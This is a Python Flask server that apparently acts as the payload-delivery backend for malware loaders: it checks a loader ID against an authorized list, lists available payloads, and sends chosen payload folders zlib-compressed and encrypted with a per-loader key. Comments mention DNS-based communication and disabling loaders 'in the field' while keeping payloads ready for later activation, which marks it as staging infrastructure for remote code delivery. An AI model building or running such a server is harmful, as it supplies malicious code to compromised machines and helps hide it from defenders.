from flask import Flask, request, jsonify, current_app
import os, io
import zlib
import nacl.secret, nacl.utils
import requests

from flask.helpers import send_file
app = Flask(__name__)

class InvalidUsage(Exception):
    status_code = 400

    def __init__(self, message, status_code=None, payload=None):
        Exception.__init__(self)
        self.message = message
        if status_code is not None:
            self.status_code = status_code
        self.payload = payload

    def to_dict(self):
        rv = dict(self.payload or ())
        rv['message'] = self.message
        return rv

@app.errorhandler(InvalidUsage)
def handle_invalid_usage(error):
    response = jsonify(error.to_dict())
    response.status_code = error.status_code
    return response

@app.route('/')
def dataroute():
    #this is for various other types of communicating with the packer
    #such as through DNS, the format of the data field should be this
    #<id> <payload>
    data_field = request.get_data(cache=False, as_text=True)
    
    args = data_field.split(' ')
    if len(args) == 0 or len(args) > 2:
        return ('', 204)
    if len(args) == 1:
        args.append('')
    return packer(args[0], args[1])

#This is the api used when the loader 
@app.route('/api/<id>', methods=['GET'])
def apiroute(id):
    return packer(id, '')

def packer(id, query):
    #todo: authenticate this api access with use of secret key

    #the reason why we have an authorized-ids.txt is that we may want to
    #disable a loader in the field, but keep payloads ready for future activation
    with current_app.open_resource('static/authorized-ids.txt') as f:
        authorized = False
        for ids in f:
            ids = ids.strip() #remove \n
            if id == ids.decode():
                authorized = True
                break
    if not authorized:
        raise InvalidUsage(message='This is a restricted server. Your IP has been logged.', status_code=403)
    
    #available payloads for a particular loader
    available_payloads = []
    for (_, dirnames, _) in os.walk('static/' + id):
        available_payloads.extend(dirnames)
    
    send_arg = request.args.get('send', '')
    if send_arg == '':
        send_arg = query

    #choose a payload or get available payloads
    if send_arg in available_payloads and send_arg != '':
        try:
            #encryption with PyNacl
            key = open('static/' + id + '/secret-key', 'rb').read()
            box = nacl.secret.SecretBox(key)

            #fileblob will contain all the compressed files
            fileblob = bytearray(b'')
            #filemeta will have the following format, original file size . compressed file size . encrypted file size
            #each file compressed and added to the fileblob will have a corresponding filemeta tuple
            file_meta = ""
            for (root, _, filenames) in os.walk('static/' + id + '/' + send_arg):
                for filename in filenames:
                    #we will pack all files contained in the payload folder, no matter what subfolders they may be in
                    current_file = open(os.path.join(root, filename), 'rb').read()
                    compressed_file = zlib.compress(current_file, zlib.Z_BEST_COMPRESSION)
                    encrypted_file = box.encrypt(compressed_file)

                    file_meta = file_meta + str(len(current_file)) + "." + str(len(compressed_file)) + "." + str(len(encrypted_file)) + "." 
                    fileblob.extend(encrypted_file)
            
            #we should send the metadata in the filename
            return send_file(io.BytesIO(fileblob), as_attachment=True, attachment_filename=file_meta)
        except Exception as e:
            return str(e)
    else:
        return jsonify(available_payloads)

if __name__ == "__main__":
    #app.run(port = 25566)
    #app.run(port = 25566, ssl_context='adhoc')
    app.run(host = "0.0.0.0", port = 25566)
    #app.run(host = "0.0.0.0", port = 25566, ssl_context='adhoc')